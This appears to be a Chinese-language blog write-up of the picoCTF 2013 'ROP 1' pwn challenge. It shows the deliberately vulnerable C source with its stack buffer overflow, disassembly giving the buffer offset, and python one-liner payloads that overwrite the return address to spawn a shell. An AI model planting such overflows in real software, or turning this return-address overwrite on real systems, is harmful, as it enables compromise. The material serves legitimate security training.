@@ -1,0 +1,76 @@
+---
+layout: post
+title: ROP 1
+categories: writeups
+tags: pwn
+ctfsite: picoctf-2013
+challenge_url: https://github.com/picoCTF/picoCTF-2013-problems/tree/master/ROP%201
+---
+
+这是一道基本的溢出题，也提供了源码：
+
+```c
+#undef _FORTIFY_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int not_called() {
+	return system("/bin/bash");
+}
+
+void vulnerable_function() {
+	char buf[128];
+	read(STDIN_FILENO, buf, 256);
+}
+
+void be_nice_to_people() {
+	// /bin/sh is usually symlinked to bash, which usually drops privs. Make
+	// sure we don't drop privs if we exec bash, (ie if we call system()).
+	gid_t gid = getegid();
+	setresgid(gid, gid, gid);
+}
+
+int main(int argc, char** argv) {
+	be_nice_to_people();
+	vulnerable_function();
+	write(STDOUT_FILENO, "Hello, World\n", 13);
+}
+```
+
+{% include writeup_begin.html %}
+
+看一下 `vulnerable_function` 的反汇编代码，`buf` 在 `$ebp-0x88` 处：
+
+```asm
+/ (fcn) sym.vulnerable_function 41
+|   sym.vulnerable_function ();
+|           ; var int local_88h @ ebp-0x88
+|           ; var void *buf @ esp+0x4
+|           ; var size_t nbyte @ esp+0x8
+|           0x080484b8      push ebp
+|           0x080484b9      mov ebp, esp
+|           0x080484bb      sub esp, 0x98
+|           0x080484c1      mov dword [nbyte], 0x100 ; [0x100:4]=-1 ; 256 ; size_t nbyte
+|           0x080484c9      lea eax, [local_88h]
+|           0x080484cf      mov dword [buf], eax ; void *buf
+|           0x080484d3      mov dword [esp], 0 ; int fildes
+|           0x080484da      call sym.imp.read ; ssize_t read(int fildes, void *buf, size_t nbyte)
+|           0x080484df      leave
+\           0x080484e0      ret
+```
+
+因此首先使用 0x88 个字节把缓冲区填满，4 个字节填满 ebp，后面 4 个字节填上 `not_called` 的地址。由于 `read` 需要读取 256 个字节，再把剩下的字节随便填上即可：
+
+```python
+(python -c "print '0' * 0x88 + '0000\xa4\x84\x04\x08' + '0' * (256 - 0x88 - 8)";cat) | ./rop1-fa6168f4d8eba0eb
+                               ↑EBP ↑----返回地址----↑    ↑缓冲区剩余部分
+```
+
+不过这条命令在 Ubuntu 18.04 中会有点问题，`cat` 无法继续读入 `stdin` 的内容。这时可以直接将要执行的命令添加在 python 的字符串后面，比如
+
+```python
+python -c "print '0' * 0x88 + '0000\xa4\x84\x04\x08' + '0' * (256 - 0x88 - 8) + 'ls'" | ./rop1-fa6168f4d8eba0eb
+```
+
+{% include writeup_end.html %}
